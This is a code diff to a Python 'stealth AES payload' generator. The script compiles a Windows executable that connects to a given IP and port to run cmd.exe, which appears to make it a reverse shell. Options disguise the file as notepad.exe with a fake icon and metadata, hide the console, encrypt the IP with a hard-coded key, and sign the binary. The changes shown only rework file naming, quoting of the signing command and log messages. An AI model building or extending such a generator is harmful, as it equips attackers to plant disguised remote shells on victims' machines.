@@ -3,6 +3,7 @@ from Crypto.Util.Padding import pad
 import argparse
 import subprocess
 import os
+import shlex
 
 key = b'1GJ7d9gY57Fdjo43'
 aes = AES.new(key, AES.MODE_ECB)
@@ -173,8 +174,7 @@ END
         print("[+] notepad.rc generated.")
 
 def compile_payload(notepad=False, keep=False, hidden=False, sign=False):
-    output_name = "notepad.exe" if notepad else "payload.exe"
-    temp_name = "temp.exe"
+    exe_name = "notepad.exe" if notepad else "payload.exe"
 
     try:
         cmd = [
@@ -187,39 +187,41 @@ def compile_payload(notepad=False, keep=False, hidden=False, sign=False):
             subprocess.run(["x86_64-w64-mingw32-windres", "notepad.rc", "-O", "coff", "-o", "notepad.res"], check=True)
             cmd.append("notepad.res")
 
-        cmd += ["-o", temp_name, "-lws2_32"]
+        cmd += ["-o", exe_name, "-lws2_32"]
         if hidden:
             cmd.append("-mwindows")
 
         print(f"[*] Compiling: {' '.join(cmd)}")
         subprocess.run(cmd, check=True)
-        print(f"[+] Compilation successful: {temp_name}")
+        print(f"[+] Compilation successful: {exe_name}")
 
         if sign:
-            print("[*] Signing with sign_exe.py...")
-            subprocess.run(["python3", "sign_exe.py", temp_name, "--output", output_name], check=True)
-            os.remove(temp_name)
-        else:
-            os.rename(temp_name, output_name)
+            output_name = exe_name.replace(".exe", "_signed.exe")
+            sign_cmd = f"python sign_exe.py {shlex.quote(exe_name)} --output {shlex.quote(output_name)}"
+            print(f"[*] Signing: {sign_cmd}")
+            subprocess.run(shlex.split(sign_cmd), check=True)
+            print(f"[+] Signing complete: {output_name}")
 
     finally:
         if not keep:
             for file in ["payload.c", "notepad.rc", "notepad.res"]:
                 if os.path.exists(file):
                     os.remove(file)
-                    print(f"[-] Removed temporary file: {file}")
+                    print(f"[-] Deleted temporary file: {file}")
         else:
-            print("[*] --keep option enabled: temporary files retained.")
+            print("[*] --keep option enabled: temporary files kept.")
+
+# ...
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Stealth AES payload + build generator")
+    parser = argparse.ArgumentParser(description="Stealth AES payload + compiled generation")
     parser.add_argument("--ip", required=True, help="IP address to encrypt")
     parser.add_argument("--port", type=int, default=49557, help="TCP port (default: 49557)")
     parser.add_argument("--cmd", default="cmd.exe", help="Command to execute (default: cmd.exe)")
     parser.add_argument("--notepad", action="store_true", help="Fake notepad with icon and metadata")
     parser.add_argument("--keep", action="store_true", help="Keep temporary files")
     parser.add_argument("--hidden", action="store_true", help="Hide the console and cmd.exe")
-    parser.add_argument("--sign", action="store_true", help="Sign the final executable using sign_exe.py")
+    parser.add_argument("--sign", action="store_true", help="Sign the executable using sign_exe.py")
 
     args = parser.parse_args()
 
